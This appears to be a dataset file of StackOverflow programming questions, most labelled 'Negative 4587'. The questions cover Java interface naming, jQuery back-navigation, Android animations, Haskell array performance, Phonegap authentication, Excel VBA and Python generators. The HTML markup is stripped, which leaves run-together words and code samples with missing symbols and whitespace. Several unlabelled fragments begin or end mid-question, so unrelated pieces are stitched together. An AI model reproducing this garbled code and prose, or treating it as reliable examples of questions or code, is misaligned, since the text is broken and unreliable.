valuecitizen.citizenTypeIdgt  ltdivgt ltcforEachgt ltdivgt ltformformgt ltbodygt lthtmlgt codepre  pstrongCitizenRegistrationController.javastrongp  precodeController public class CitizenRegistrationController        private final Logger logger  Logger.getLoggergetClass       Autowired     private CitizenTypeManager citizenTypeManager     ............

Negative 4587 pIve seen a hrefhttpstackoverflow.comquestions541912interfacenaminginjavathea a hrefhttpstackoverflow.comquestions2814805javainterfacesimplementationnamingconventioncanonicala classinterface naming questions on StackOverflow and read a lot of other a hrefhttpisagoksu.com2009developmentjavanamingthejavaimplementationclasses relnofollowopinionsa on the subject, but I have a related question that Im not sure is answered in any of those places.  I tend to hate either the IInterface or ClassImpl naming conventions because and agree with the sentiments in both the answers to the questions that I linked and the article theyre unnecessary given modern IDEs, make the code harder to read, and in many cases the need to use one of those naming schemas seems to imply an incorrect design.p  pHowever, I often run into a scenario where I have an interface that I want to expose as part of my API usually in a separate package, and then I create an abstract implementation of the interface to contain some common functionality that I expect most but not all concrete implementations to derive from.  For examplep  precodepublic interface Foo      public String getBar   public abstract class BasicFoo implements Bar      private String bar      Override     public String getBar          return bar       codepre  pIn practice I tend to prefix the implementation name with Basic, but what Im doing is essentially exactly what some folks are using the Impl suffix for providing a basicdefault implementation.  I could try a name that implies that its a Foo backed by in memory storage for example of Bar, but that always capture all the functionality in BasicFoo.  Im also not convinced that I should throw out the interface and expose the implementation directly because the interface provides additional flexibility and decoupling.p  pThoughts on a better way to handle this scenario, or a logical naming conventionp

Negative 4587 pI have a web page, codepage1.htmlcode, with jQuery scripts on it, including a codedocumentcode handler that wires up the event handlers on the page when the page is first visited. After the page is loaded, a user clicks on an codeltagtcode element and navigates away to another page. The user then backnavigates to the initial codepage1.htmlcode.p  pWhat Im seeing is the codedocumentcode event handler is firing when the user backnavigates, which was not what I was expecting. I naively assumed that once the page has been built by the browser, and the user browses back, the buildup state of the page would still be there.p  pI would like to be able to distinguish the states Im visiting the page afresh versus Im backnavigating to the page after visiting some other page. How is this done, idiomatically, in jQueryp

Negative 4587 pI am working in android 2.3 and I have an issue which is a bit of a pain.p  pI have 2 layouts on top of each other in a codeFrameLayoutcode. The top layout is moved partly offscreen during an animation, and the code.layoutcode method is called in the animation end. This works great and the ui is moved correctly and the buttons of the toplayout is still clickable. After the animation the second layout is visible as the toplayout is moved offscreen. This layout contains a list which is clickable and each cell has an codeImageViewcode which is updated when clicked. However my problem is, when the table cell is clicked and the codeImageViewcode is updated, the entire view is reset, ignorering the animation and new location of the toplayout. It just sets the toplayout back on top as the animation never happend.p  pI use an codeTranslateAnimationcode and the set fillafter is set to true as well.p  pDo you guys have any suggestions to what I might be missing.p

So when I try to mark attendance when pre marked attendance exists, it doesnt mark attendance for other employees. ex.

This seems strange because Haskell is a compiled language which are often faster than interpreted ones and I had heard repa arrays had good performance although this may have just been in comparison to other Haskell data types, like the list.p  h2What I triedh2  pThe first thing I did was notice I was using explicit recursion and so I decided to replace it using a fold, which would also mean I no longer had to check if I was beyond the bounds of the arrayp  precoder,g,b  foldl f 0,0,0 [x, y  x lt [0..w1], y lt [0..h1]] f r,g,b row,col  addCol 0 r, addCol 1 g, addCol 2 b         where addCol x v  v  fromIntegral img R. R.Z R.. col R.. row R.. x codepre  pThis made it run slower 1.2 seconds so I decided to profile the code and see where most of the time was being spent in case I had created an obvious bottleneck or the repadevil package was just slow. The profile told me that 58 of the time was spent in the f function and 35 of the time was spent in the addCol.p  pUnfortunately I cannot think of any way to make this run faster. The function is just an array index and an addition  the same as the python code. Is there a way to improve the performance of this code or does the Python Image Library just offer greater performancep

Negative 4587 pIm working on my app and for this activity I was going to build a new layout file for it. However eclipse gave me an error stating that layout was not updated in the R.java file. So I read online that modifying manifest would update the R.java file but it didnt. So I clicked on clean project and my R.java file disappeared propagating errors across all my src files. Now I heard that it could be due to layouts named with capital letters but all my layouts start with small letters. Also even if I manually add a R.java file and click on clean, the R.java disappears after. I really dont know what to do now. I also tried most of the solutions from the similar questions but to no avail.p

Second of all, before you read the request and think Im trying to get easy answers, trust me, Ive spent the last 7 days searching for them online, but havent found any that answered my very specific question. And third, sorry about the long description, but the help I need is to be pointed in the right direction.p  pI had an idea for a small class project about genetic drift. In population genetics, a probability matrix is used to give the probability that the frequency of an allele will change from i to j in generation t1 to generation t2. p  pSo, say I start with one copy of allele B in t1 and want to know the probability of it going to three copies in t2. The value as given by the binomial distribution, to which I have already wrote a small code, which works nicely then would go in the cell corresponding to column 1, row 3 perhaps this can clarify things better a hrefhttpsdocs.google.comviewerurlhttp3A2F2Fsamples.jbpub.com2F97807637573732F57373CH04FINAL.pdf relnofollowhttpsdocs.google.comviewerurlhttp3A2F2Fsamples.jbpub.com2F97807637573732F57373CH04FINAL.pdfa. p  pWhat I dont know how to do and would like to get information on is p  ul liphow do I make a square matrix where the number of rowscolumns is determined by the user say someone wants to get the probability matrix for a population of 4, which has 8 allele copies, but someone else wants to get the probability matrix for a population of 100, which has 200 allele copiespli liphow do I apply the binomial distribution equation to the values of each one of the different columnrow combinations i.e. in the cell corresponding to column 1, row 3, the value would be determined by the binomial equation with variables 1 and 3 and in the cell corresponding to column 4, row 7, the value would be determined by the binomial equation with variables 4 and 7. The number of different combinations of variables like 1 and 1, 1 and 2, 1 and 3, etc is determined by the number of columnsrows set by the user. pli ul  pIm not asking anyone to give me the code or do my work for me, what Im asking is for you, seasoned programmers, to point me in the direction of the correct answers, since Ive so miserably failed in finding this direction. Should I be looking into arrays instead of matrices Should I be looking into specific iterators Which Does anyone have more specific material I could look into, or could give me tips based on experience with creating matrices I really want to learn ruby, and learn how to do this, not just get it done. p

Negative 4587 pIm developing a mobile application using Phonegap. Now Ive been doing some research for authentication and I cant seem to find a propper answerexample of how this should be done.  Ive got an ASP.NET MVC4 backend so I would like to use ajax calls to call the methods I need. p  pNow the login at the beginning of the App isnt that difficult. But the problem is that I dont want the methods to be publicly accessed. Within the webapplication I solved this by using the [Authorize] tag above my Controller method. But this doesnt seem to work within a Phonegap App because you cant save cookies and have sessions like in a your browser. p  pI did read that you can use Phonegap localstorage as an alternative to cookies and sessions. But Im not sure how to apply this.. I also came across the suggestion to store the username and password in a database and give it in each ajax call so I could authenticate each time. But this didnt seem like a favorable and secure solution.p  pI hope my question is clear and you guys can point out some suggestions or examples. I apologize for my grammar, English isnt my native language. Thanks in advancep

Negative 4587 pWe have a Java EE 5 based JSF application which runs on 2 WebLogic application servers, which share an Oracle database. p  pFor some use cases its crucial, that only one node does the operations within the database, which are typically permanent background jobs. Therefore the idea was, that one node the master obtains some sort of lock within the database, and the other node the slave recognizes the lock and does nothing for those use cases as long as the master is available. Only if the first node becomes unavailable, the second node should take over the work and thus from there on holds the lock itself.p  pMy question now is, how would we implement this behaviour remember, JPA 1.0 and will the lock be automatically released in the database if one node goes down Or should the whole thing be better done in a different wayp

Negative 4587 pBasically, what I want to do is to close another app not created by me from my app. I havent been able to find a solution but have learned that this is something many critizise as being a bad solution in general.p  pI do believe I have a good reason. What I want to do is to have an app that can recieve a file via PUSH OPP from another device that doesnt have an app installed on it. To be able to do this I have to disable the hostdevices PUSH OPP application. I have to do this since I need to take over the default channel 12 for pushing files from the OS so that I have controll over the filesending from the client. I cant use another channel since I cant have an app installed on the client and thus cant make it push the file via another channel. I know this probably is very bad practice but the device with the application will only be used for this specific application.p  pOne way that seems to work is to manually disable the systems PUSH OPP application but this creates a hazzle when the user should install and use the app. They have to  1. Install the app.  2. Every time they start the device they have to go into running applications and disable the standard PUSH OPP. 3. Run the app.p  pIf I would be able to send a quitcommand through my app to the native PUSH OPP app the default channel 12 would be freed up for me to use without the user having to go through step 2 every time.

Negative 4587 pI am trying to make a tree view to look as much as possible as thisp  pimg srchttpi.stack.imgur.comdUaUw.png altMy computer win 7 prop  pThe thing is i doubt that this is a tree view as the drive are in a kind of wrap panel and i couldnt make this happen in a normal tree view.p  pMy ultimate goal is to make it look like so p  pimg srchttpi.stack.imgur.comMpSMI.png altenter image description herep  pRight now the control we were using was already a tree view with codeHierarchicalDataTemplatecode but the last level is a collection that was repeating in its own template so 1 node per item. I cna remove it no problem and i know the codeHierarchicalDataTemplatecode that is the last item to contain these item so i decided to simply add a wrap panel and in it added a itemscontrol that iterate within the sub collection and it worked but the codeHierarchicalDataTemplatecode consider to be on the what i called header line of the node. and not underneath. here a quick picture of what i meant how it generate.p  pimg srchttpi.stack.imgur.com9tLri.png altenter image description herep  pthe node  end up being in the middle of the items but the problem is that there is somewhat hundreds of items in there and the scrolling dont like that.

Now add is 1 for 1000 elements, then both add and dump are zero for 8000 elements and, finally dump is 1 for 1000 elements. Now, if I have a test bench that supplies datain from 0 to 999, I expect dataout to be 0, 10, 20, 30, ..., 9990 when dump is 1. That is according to the simulation.

Negative 4587 pIm about to build a console application that needs access to the authenticated YouTube Data API. Calling the APIs themselves is not a problem, I know quite well how to make and process HTTPS requests.p  pIve already gotten the API key and the Client ID. No problems there, either.p  pThe problem is the authentication. Ive checked here a hrefhttpsdevelopers.google.comyoutubev3guidesauthenticationinstalledapps relnofollowhttpsdevelopers.google.comyoutubev3guidesauthenticationinstalledappsa On the Installed applications tab, in step two, it instructs on how to set up a url to call to do the authentication step. All good so far. But before programming anything, I thought Id try and see what that url does in the browser.p  pTurns out it just displays a login prompt. Well how about that. That wont work in this kind of console application. The idea is, presumably, that the user is somehow shown this webpage and be instructed to login and allow access. Then, somehow, by some kind of magic perhaps, the access token is sent back to my console application.p  pTwo things Im not quite sure about 1 How do I prompt for the username andor password in the console app and send emthatem to the authentication URL 2 How would I get the access token back from itp  pThe biggest problem is that the API seems to require a browser... Which isnt there. My console application will eventually run unattended, so starting up a browser and displaying a webpage and doing nothing until it returns a code, is out of the question. I need to somehow supply the authentication page a usernamepassword and get back the code right away.p

Negative 4587 pI am currently writing some code for a sample sequencer in Android. I am using the AudioTrack class. I have been told the only proper way to have accurate timing is to use the timing of the AudioTrack. EG I know that if I write a buffer of X samples to AudioTrack playing at a rate of 44100 samples per second, that the time to write will be 144100X secs.p  pThen you use that info to know what samples should be written when.p  pI am trying to implement my first attempt using this approach. I am using only one sample and am writing it as continuous 16th notes at a tempo of 120bpm. But for some reason it is playing at a rate of 240bpm.p  pFirst I checked my code to derive the time of a 16th nanoseconds note at tempo X. It checks outs.p  precodeprivate void setPeriod      periodint1doubleTEMPO601000     periodperiod10000004     Log.itest,String.valueOfperiod  codepre  pThen I verified that my code to get the time for my buffer to be played at 44100khz in nanoseconds and it is correct.p  precodelong bufferTime1000000000SAMPLERATEbuffSize codepre  pSo now I am left thinking that the audio track is playing at a rate that is different from 44100. Maybe 96000khz, which would explain the doubling of speed.

Negative 4587 pI have 3 tabs that come into play for the particular issue that I am trying to automate using VBA.p  pForm tab  Users select from a drop down list up to 10 different entities that they need access to Range A25A34p  pFLS Hiearchy This tab is a hiearchy of all of the entities within the company beginning with level 1 highest  parent level to level 10 lowest child level.  Range AD Column A is the level, B is the entity which will match the various entities selected in dropdown on Form tab, Column C is Entity Description, Column D is the Sec Class which needs to be copied over to sheet 1.  p  pSheet1  This tab is for the admin and is to be used to Find the necessary security classes from the FLS Hiearchy tab based upon the entities selected in the form tab. Range A1J1.  Security classes are to be copied beneath each variable as derived from the Form tab up to 10 entities, correlating to Column J on Sheet1.p  pI know that I need to create a loop of some kind to accomplish this.  In a nutshell the VBA script needs to identify the entities up to 10 from the Form tab, paste them in the Range A1J1 as necessary, and then go through a loop where it takes the corresponding entities beginning with A1 and find the entities in the FLS Hieararchy tab.  Once it finds each entity in the Hierarchy tab it needs to determine its level column A on Hierarchy tab.  If the level is level 6 for example, the VBA script needs to grab the security class for that line where the entity was found and then grab the security class for the entities below it until it finds the next level 6 security class and then it needs to stop there go up one row to not include the next level 6.  In this example if you find a level 6 and the next entity below it is also a 6 the VBA script only needs to grab the one security class column d for the first variable.p  pBelow is what I have so far, but I am obviously needing a lot more help to finish.p  precodeSub SecurityClasses   SecurityClasses Macro  Based off entity selected in Form tab determine the security classes needed for user.

Negative 4587 pIm making a game. Each object in the game is registered in a registry. I have an update and render method being called by a game loop. The render method calls coderepaintcode on my codeJPanelcode and I have overridden codepaintComponentGraphics gcode for graphics. When it renders and updates, it goes through each object and updates it and renders it from the registry. Sometimes I get a concurrent modification error, and i believe it is because something is calling the codepaintComponentcode other than from my game loop. If a codeJPanelcode or even codeJFramecode calls repaint on its own, is there any way to disable itp

Negative 4587 pIs there a way to create a frame that visually acts as a a hrefhttpen.wikipedia.orgwikiScroll relnofollowscrollparchmenta using only HTML5 and CSS3 For now I have achieved it through using JavaScript, but the scroll event does not trigger that often on a mobile device which makes the header and footer of the scroll stutter.p  pa hrefhttpmagiagame.comscroll.html relnofollowhttpmagiagame.comscroll.htmla In case your browser does not scroll smoothly, the best way I know on how to view the scrolling animation is by using the middle mouse button on the content and then moving the mouse up and down.p  pSo the scroll acts in the following way. When scrolling the content up or down, the header and footer scroll to the opposite direction. The header and footer show a reversed image of what is to come or what was before. The JavaScript version uses a background image that is simply the original copied and reversed, with CSS3 transform matrix only one image would be required.p  pI thought this could be possible using display absolute or fixed elements within a overflow scroll element, but neither would make the elements stay in their spots as the content gets scrolled.p  pHTML5 Canvas is another option, but it might still be as slow as the JavaScript one.p

Negative 4587 pI have a universal application with a list of items loaded from a backend and item details loaded from a backend as well. Each view controller listens to the codeUIApplicationDidBecomeActiveNotificationcode, so that the view is refreshed when the user reopens the app. That works so far. p  pNow my problem. On iPad, I have a split view. So, when the user reopens the app in landscape, both views are reloaded. If there is no connection to the backend, the user gets two alerts with RetryCancel options, one above the other. That is not what I want... I have one default item which does not require connection to the backend and I want to set it to be selected and to display its details in the detail view. Always when the originally selected item is missing in the master view.p  pWhat I have done so far... In my master view controller, I check whether the selected item is available after the refresh and if not, I update the selection and the detail view. This should solve the problem when the requests from the left and from the right pane are processed in the correct order. However, currently both view controllers get the codeUIApplicationDidBecomeActiveNotificationcode and make asynchronous requests to the backend.p  pHas someone experience in refreshing split views What would be the right way to solve my problem I really dont want to introduce additional notificationscomplexity. I hope, there is some standard way to reload the data.p

A Square is composed of 4 points which are the upper left corner, upper right corner and so on.p  pNow in my main function I create 4 point objects and I send them to the constructor of Square class, it creates my Square.p  pWhen I do the same for another Square with different values for the point objects, the values for my previously created Square are overwritten, so at the end I have two same objects. Do you know why this is happeningp  pThis is my codep  precodeclass Pointobject     def initself, x  0, y  0         self.x  x         self.y  y  class Squareobject     ul  Point     ll  Point     ur  Point     lr  Point     def initself, ul, ll, ur, lr         self.ul.x  ul.x         self.ll.x  ll.x         self.ur.x  ur.x         self.lr.x  lr.x         self.ul.y  ul.y         self.ll.y  ll.y         self.ur.y  ur.y         self.lr.y  lr.y  def main     ul1  Point1, 2     ll1  Point1, 1     ur1  Point2, 2     lr1  Point2, 1     s1  Squareul1, ll1, ur1, lr1      ul2  Point3, 3     ll2  Point3, 2     ur2  Point4, 3     lr2  Point4, 2     s2  Squareul2, ll2, ur2, lr2      At this point s1 and s2 have the same values...  if name  main     main codepre  pAny kind of help will be highly appreciated p  pCheersp

Negative 4587 pI use the a hrefhttpwww.spec.orgcpu2006 relnofollowSpec 2006a benchmarks to measure the performance of a few private passes and the generated code. So far, all my work was based on a hrefhttpllvm.orgreleases3.1docsReleaseNotes.html relnofollowLLVM 3.1a.p  pLast week I wanted to move forward with LLVM, and I rebased all of my passes to a hrefhttpllvm.orgreleases3.4docsReleaseNotes.html relnofollowLLVM 3.4a. This required only adjusting a few codeincludecode lines. However, after that change I measured a huge performance regression. Next I disabled all of my custom passes, but still performance was down. Here are the numbers of a few Spec benchmarks compiled with LLVM 3.1 and 3.4p  precode            LLVM 3.1  LLVM 3.4                401.bzip2       7.50     17.5 429.mcf         4.72      8.10 456.hmmer       4.18     10.1 458.sjeng       4.85      8.86 433.milc       13.4      26.0 470.lbm        13.4      12.6 codepre  pI also noticed that the number of functions called by e.g. code456.hmmercode went from 6 to 45009 similar numbers show for most other benchmarks.

Negative 4587 pI just got a new task I need top  pTeam have an Excel spreadsheet which contains basic data about subjects in a trial. A custom VB script in the Excel sheet allows them to generate BO reports. At a very high level, they are able to select a particular cell in the Pivot table and then execute a VB script via a custom button in the Excel sheet. The script generates an XML file containing metadata about those subjects and some additional parameters such as report title and saves the XML file to a watched directory. An external process picks it up and generates a fullyformatted BO report with complete details about the identified subjects from the drug safety database, and sends it to the user as a PDF in a new browser window.p  pSo really this is not about doing data analysis within Spotfire including R, but it is more to do with building an interface from Spotfire to the BO reporting environment. I believe this can be done with the Spotfire SDK, which uses IronPython as its scripting language, but I cannnot say for certain because I have very little experience in that area.p  pIs there any chance for some high level suggestion of what approach do I have to take in order to attain the functionality requested p  pI also dont have any exp with Spotfires tibco technical support. Do you guys think I can ask any such questions to them p  pRegards, Jacekp

Negative 4587 pIm trying to build a chatroom using Martini.p  pI put together some HTML, CSS and JS using Bootstrap, and now I want to display it using Martini.

Here goesp  pI have a hrefhttpejie.me relnofollowclover installeda tabs in explorer. I have created an Excel ribbon for an Excel addin, using ExcelDNA.

That is, the method for the clickevent contains something like the following two linesp  precodevar window  new MyWindow window.ShowDialog codepre  pWhen I fire up the addin and click the button, Clover crashes if it is open. The error occurs when calling the codeShowDialogcodemethod. Does anyone have any idea what could cause this It might be a problem with ExcelDNA or it might be a problem with Clover.

Negative 4587 pWe use the excellent AuthSMTP service for outgoing mail from our MVC application. Until we upgraded to .Net 4.5.1 we used SmtpMail.SendAsync to send out multiple emails at once via IIS7. IIS7 is set to relay mail through AuthSMTP.p  pThese days asynchronous code in .Net seems to work differently. We rolled back to SmtpMail.Send which has slowed the site down where multiple mails are sent. We are considering the following options.p  ol lipRewrite the code to work with the Taskbased Asynchronous Pattern. Were fairly confused by this but could persevere if its a good option.pli lipSave email to the database and send it using a console application triggered as a scheduled task. We like this option because it gives us an archive of sent email. On the other hand wed need to hit the database to store the emails, which may be slower than asking IIS to dump outgoing mail to a queue folder.pli lipHave IIS save outgoing mail to a queue folder, and write a console application to process that queue. We could archive each message on disk, which is a worse archiving solution than storing in database.pli lipSomething else.pli ol  pCan anyone tell us the most performant solution base on their experiencep  pThanksp

I also converted all the conditional statement, changing codeifconditioncode into codefunction condition code.p  pNow what should I do  I was thinking of something like this p  precodeifcondition1  message for condition1 ... else ifcondition2  codepre  pThe problem is that this file might be included by another file that will be executed because there is no die statement anymore.p  pSo should I include a var like Die in the view object and check its value before doing anything on every page  This doesnt seem clean to me. I have thousands of lines of code like this so the more simpleautomated the solution, the better.p

I dont need to connect to Access right knowp  pI have made all of the suggested changes to IIS and the web server that were listed.p  pThe one thing that I did that is not standard is that on the root folder of the web site I created a sub folder.  I made that sub folder an Application in IIS and I have assigned the Classic ASP Application pool to that sub folder.p  pI did that so that I could make Handler Mappings changes without disturbing the rest of the web site.  BTW the main web site has not been written yet.  There are other two sub folders that contain web pages for other applications that are linked to by another web site on another server.  Eventually that web site will be moved to this server because the existing site in on a Server 2003 box and we want to move it to this 2008 R2 virtual server.p  pI created a very simple classic asp page that just is support to print Hello World on the page.  The problem is that it does NOT print Hello World on the page.

Without getting the vbscript code to work then I am dead in the water when it comes to moving the web site over to this new server.

Negative 4587 pI am creating a button that when you push it, it takes the value of a date field represented on a form and adds a number to it.  Upon adding the number, the result should be represented in another date field represented on the form In short, I am trying to create a button that adds 7 days to a start date calculating the finish date depending on how many weeks the user chooses how many times he pushes the button.

Negative 4587 pIm evaluating Apache Spark and its Spark Streaming component for a backend of a web app amp external API. With such a setup, the backend will receive a lot of data that is not uniformly timed e.g. in response to user actions on the website. strongEditstrong In most cases, Ill want a realtime response for the user. The faster the better, but latency of 13 seconds is ok. A sample use case is the user requesting to see a statistical graph in the web UI.p  pFrom the documentation, I understand that the fundamental model of Spark Streaming is data processed at equal intervals the batch duration, e.g. of 1 second or so.p  pThe batching that Spark Streaming performs could perhaps be useful to reduce the number of RPCs from my Frontend to my Backend from oneperevent to onepersecond.p  pBut besides that this architecture seems to have flawsp  ul li Processing events at fixed intervals, and not as they occur. li The slightly unusual control flow in Spark Streaming programs pre doSparkStreaming    ltdefine processing on data unclear how it gets called latergt   streamingContext.start   streamingContext.awaitTermination  pre li Unnecessary polling of data sources during long times of user inactivity. ul  pIm leaning towards NOT using it.

Pretty basic stuff.p  pAs you can see, the sections, which make up the columns, are not of equal length. That is, there is more text in section two than section one. For this reason, section two will be taller than section one if the browser window is small enough.p  pWhat I want to accomplish is, after the columns have loaded, I want to divide the sections amongst the columns emso that the columns are as close as possible to equal heightem. So, if the column on the left is taller compared to the one on the right, the function will move the appropriate amount of sections from the left column to the right column.p  pBut if the browser window is big enough that the text does not have to wrap, because each section is, in this example, quite a short piece of text, nothing needs to happen. Theyre all the same height.p  pI also want to be able to call this function more than once if more content is added to a sectionthe window is resized.p  pHere is some Javascript code I have triedp  precodefunction sections   collect the height of every section. sectionheightarray0  new Array sectionheightarray1  new Array fori0iltdocument.getElementsByClassNamesection.lengthi sectionheightarray1[i]document.getElementsByClassNamesection[i].clientHeight  Array.prototype.sum  function  var count0 for ithis.lengthi  countthis[i]  return count   using the height of each of the sections, check if the right side is longer than the left, and if so, make the left side longer by moving a section into the left column. while sectionheightarray0.sumltsectionheightarray1.sum  sectionheightarray0.pushsectionheightarray1.shift   by default, the left side is always longer than the right.

Cross browser is obviously preferred.p  pI know the Columnizer JQuery script exists for this purpose, but I would like to be able to do this without the use of JQuery. Partly thats because I find JQuery to be quite confusing, but mainly it is because I dont use JQuery anywhere else on my site, so I would only be calling it for this one purpose  which seems overkill for such a simple task.

Negative 4587 pIve been using the Weka GUI the explorer in 3.7.11 specifically to train some models. I then save the trained model by rightclicking on the model in the results pane. Ive written some simple Java code that can load that saved model and use it to classify new instances. This all works great.p  pNaturally, Id like to do some preprocessing to my data before training the model. Some of the preprocessing steps learn values. For example, the missing values filter learns the mean or mode of each feature from the training data. I would therefore like to save the learned filters just like I saved the learned model so I can apply the filters and then the model to new instances that werent available when I trained my model.p  pI cant seem to find any way to serialize the filters. Can this be done If not, any advice for a simple workaroundp

Negative 4587 pI have several general questions about C that I was wondering if someone could answer. Im writing a .cpp file that has the implementations for the header file my teacher is providing us. We are not allowed to modify the file. Basically, the header has declarations for a base class ship, and 4 specific types of ships. My questions are 1 The class definition for base class ship does not have a constructor provided. Instead, it has a protected Set function that sets the values for the private data members. Does the compiler provide a default constructor Basically does it automatically set the private int variables equal to 1 Because I am using the dynamic memory function new to create objects of derived classes of Ship. p  p2I have the function header virtual int sizevoid const  0 inside base class ship. I want to use the size function inside another member function to check to see if the size of a ship is valid. Would i use thissize to do that inside the member function declaration I overrided the virtual function size in each specific derived classs implementation alreadyp  pThankyou very much Please let me know if I need to include code or be more specific. I appreciate the help.p

Negative 4587 pFirst some contextp  pCurrently I have a Jenkins job setup to run a perl script, that in turns builds source code on whatever machine it is running.p  pFrom my observation of the Jenkins behaviour, if I abort a running Jenkins job from the UI all the associated threads single or parallel of my perl script are killed on the respective slave machine.p  pNow what I would like to replicate that behaviour ie abort a Jenkins job IF during my build step my script produces some errors. Unfortunately I am not able to easily modify or update the perl script that is being launched I am not the owner so I have to find a solution that would need minimal modification the perl script itself, if possible of course.p  pThe reason I need it to be aborted is because we do not want to build any down stream dependencies after the areareposlocation where an error has been produced.p  pWould I be able to automate this type of behaviour Maybe by scanning the logs of the perl script in search of error Or something of the sortp  pAny leads would be much appreciated.p  pDo let me know if more informationclarification is needed.p  pThanks.p  pEDITp  pI found an interesting solution that actually aborts the job. By running the following commandp  precodecurl request POST  u ltusernamegtltpasswordgt JENKINSURLjobJOBNAMElastBuildstop codepre  pOf course, I would now have to figure a way to launch this command whenever any errors are found in the areas that are currently being compiled.p  pI feel like I am half way though.p

Negative 4587 pI have custom collection class that holds a specific custom object. The object class is called codeTestReportcode and the collection class which holds these objects is called codeTestReportscode and it inherits codeSystem.Collections.CollectionBasecode. codeTestReportcode contains the property codeLocalReportIDcode and codeScoreTypeIDcode. What I want to do is iterate through the collection of objects and remove any duplicates, which in my case means that the codeScoreTypeIDcode and codeLocalReportIDcode are the same between objects. What I have so far leaves out objects and doesnt do the job properly, and I am quite stumped as to the solution. Note here that each time there is a duplicate, I take the object and place it in another collection before I remove the duplicates. Im not set on doing this, it was just my idea, but if there is a better way of accomplishing it, please let me knowp  precodeTestReports objTestReportsContainer  new TestReports foreach TestReport objTestReport in objTestReports      objTestReportsContainer.AddobjTestReport  objTestReports.Clear  for int i  0 i lt objTestReportsContainer.Count  1 i      for int k  objTestReportsContainer.Count  1 k gt 0 k              if objTestReportsContainer.Itemk.LocalReportID  objTestReportsContainer.Itemi.LocalReportID ampamp             objTestReportsContainer.Itemk.ScoreTypeID  objTestReportsContainer.Itemi.ScoreTypeID ampamp             objTestReportsContainer.Itemk.LocalReportID  0                              objTestReports.AddobjTestReportsContainer.Itemk                 objTestReportsContainer.RemoveobjTestReportsContainer.Itemi                 objTestReportsContainer.RemoveobjTestReportsContainer.Itemk                          else if objTestReportsContainer.Itemk.ScoreTypeID  objTestReportsContainer.Itemi.ScoreTypeID ampamp                      objTestReportsContainer.Itemk.LocalReportID  0 ampamp                       objTestReportsContainer.Itemi.LocalReportID  0                              objTestReports.AddobjTestReportsContainer.Itemk                 objTestReportsContainer.RemoveobjTestReportsContainer.Itemi                 objTestReportsContainer.RemoveobjTestReportsContainer.Itemk                     codepre  pThe original items were populated in codeobjTestReportscode and I moved them over to codeobjTestReportsContainercode so I could do all the work with that collection and add the final filtered collection back to codeobjTestReportscode.

Any better way to solve this problemp  pstrongEDITstrong I forgot to note that in the if statements I separate between whether or not LocalReportID is 0 or not because if it is the TestReport object is considered an average report and if it isnt 0 its a band report.

Negative 4587 pI have a 3 step process for uploading a CSV file to be placed in the database.  It seems that if the CSV file is too big on the third step I get a 403 error.  I tested this by removing columns and copying data with no special characters to to troubleshoot when the error occurs, and when the process completes. The file isnt that big either, only about 10 kb.p  pThe 3 steps php pages are as follows 1. Select and upload the CSV. 2. CSV runs through the filegetcsv command and a table with text fields appears allowing user to modify data.  Then user clicks submit. 3. Data goes through POST and displays all data in a new table as a confirmation pagep  pFor the small test files only a few columns and rows everything worked fine.  Once we tried testing it with files with more data, we got an error 403 on step 3.p  pAs part of the troubleshooting I did, I commented out everything except the fgetcsv function and the actual form tags and submit button no data being outputted and the error still occurred.  Is the data from the fgetcsv getting hung up somewhere causing the 403 errorp  pHere is my full page that works with the smaller test files, but fails with the larger test files.

Negative 4587 pI have an iOS App that is splitted in some categories. For that reason I builded a Tabbar. Thats working fine. In one View of the Tabbar I want to add a PageView.p  pI did this with the Interface Builder and Storyboard. The PageViewController is subclassed and its also used for the datasource and delegate protocol. I added another ViewController to the storyboard which represents one PageItem of the PageView.p  pThe view will appear, but overlayed by the Tabbar and the NavigationController. My Storyboard looks like a hrefhttpi.stack.imgur.compbzCx.png relnofollowthisa.p  pWhen I run the App in the simulator the view gets loaded, but the label is hidden by the NavigationController. This image shows the overlayed a hrefhttpi.stack.imgur.compn1TL.png relnofollowlabela.p  pI am using AutoLayout. Of course I could add a constraint to realize a margin from top and bottom. But the heights of the NavigationController and the Tabbar varies on differ devices So it wouldnt be a good solution.p  pIs there any good solution for resizing the View to the correct sizep  pKind regardsp  pEDIT When I change the Extend Edges properties, then the view will appear correctly. But unfortunately behind the translucent bars tab bar and navigation bar the color changes to black. So dark gray shines though the translucent bars. Any ideas are appreciated. Here is a screenshot hpi.stack.imgur.com7Hy6i.png after setting the extend edges to none. The bars are now dark gray because of the black background. Is there a way to change that background color behind the barsp
Negative 4587 pI am currently coding a python program that checks proxies if they respond and also measures how long it takes. The url Im GETing is a public api that allows millions of requests per second ipify.org, so that shouldnt be the bottleneck.

Negative 4587 pIm using some generators to build a processing pipeline in Python.

As an examplep  precodefrom itertools import izip, tee   first generator def gen     for i in range10         yield i  second generator that uses gens values def gen2x     for i in x         yield i2   third generator that requires values from gen and gen2 def gen3iter, iter2     for iter1, iter2 in izipiter, iter2         yield iter1iter2 codepre  pI would use it like thisp  precodex, x2  teegen y  gen2x z  gen3x2, y  nextz codepre  pThere are a couple of issues, though. p  ol lipI need to create a copy of codegencodes values because the second generator consumes the values that also need to be used by codegen3code. pli lipIt is a bit awkward to try to obtain previous values in a pipeline. It doesnt seem to be something that generators are suitable for. pli ol  pThe pipeline I have requires previous values only once, so Im a bit hesitant to use OOP for this situation. I cant really use a list instead of a generator in most steps, because memory consumption would be too high. What is a good way to address this issuep

Negative 4587 pI am a Java developer but I have not yet got a lot of experience in software architecture.p  pI have the following situation. I am creating a batch application a command line application that run into the shell so it is started from a strongmainstrong method defined into a strongMainstrong class.p  pInto this strongmainstrong method I create some objects instances of other classes that do something such as performing query on a DB, create PDF, etc so here the application could fail.p  pIf the application dont fail everything went as expected the strongmainstrong method end with an strongexit code  0strong.p  pI want that if the application fail at any point the returned strongexit code is 1strong.p  pSo now I dont know how I have to handle this situation.p  pFor example if into the strongmainstrong method I have something like thisp  precode Create DAO object FatturaDAO fatturaDAO  new FatturaDAOconn listaFatture  fatturaDAO.getListaFatturePDFpartitaIVA codepre  pin which I create and use a strongDAOstrong object. Considering now the case in which something fail into the strongFatturaDAOstrong object for example connection is lost and an exception is thrown.p  pHow correctly handling this situationp  pI have 2 ideas but I dont know what is the best solutionp  ol lipI put some try catch blocks inside my code so if something fails it enter into the strongcatchstrong block that handle it performing ap  precodeSystem.exit1 codepreli lipIf something fail it enter into the strongcatchstrong block that instead of exit throws a custom exception that goes back until the strongmainstrong method that performp  precodeSystem.exit1 codepreli ol  pOr maybe can I handle these situations in some other smarter wayp

